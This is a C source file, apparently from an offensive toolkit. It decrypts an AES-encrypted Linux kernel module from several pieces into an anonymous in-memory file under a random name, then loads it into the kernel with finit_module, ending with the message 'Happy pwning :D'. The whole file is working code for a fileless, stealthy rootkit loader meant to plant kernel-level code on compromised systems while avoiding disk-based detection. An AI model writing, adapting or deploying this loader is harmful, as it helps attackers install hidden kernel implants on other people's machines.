#include "../include/load.h"
#include "../include/cipher.h"
#include "../include/utils.h"
#define _GNU_SOURCE
#include <linux/memfd.h>
#include <linux/module.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <stdlib.h>
#include <string.h>

int decrypt_lkm(fraction_t *fractions, int fractions_count,
                unsigned char *key) {

  int fd;
  size_t module_size = 0;
  ssize_t ret, written;
  uint8_t *buf;
  char *filename;

  filename = generate_random_string();

  log_debug("Using random filename %s", filename);

  fd = syscall(SYS_memfd_create, filename, 0);

  free(filename);

  if (fd < 0) {
    log_error("memfd_create failed");
    return fd;
  }

  for (int i = 0; i < fractions_count; i++) {
    // this is always bigger then the plain text size
    buf = malloc(fractions[i].data_size);

    ret = aes_decrypt(fractions[i].data, fractions[i].data_size, key,
                      fractions[i].iv, buf);
    if (ret < 0) {
      log_error("Could not decrypt fraction at index %d", i);
      close(fd);
      free(buf);
      return -1;
    }

    written = write(fd, buf, ret);

    if (written < 0) {
      log_error("Error writing to memfd");
      close(fd);
      free(buf);
      return -1;
    }

    if (written != ret) {
      log_error("Incomplete write to memfd (Expected %ld, wrote %ld)",
                ret, written);
      close(fd);
      free(buf);
      return -1;
    }

    module_size += ret;
    log_debug("Decrypted fraction %d, current module size %ld", i, module_size);
  
    free(buf);
  }

  log_debug("Decrypted LKM. LKM size = %ld", module_size);

  return fd;
}

int load_lkm(int fd) {
  if (syscall(SYS_finit_module, fd, "", 0) != 0) {
    log_error("Failed to init module");
    return -1;
  }

  log_info("Module loaded successfully. Happy pwning :D");

  return 0;
}
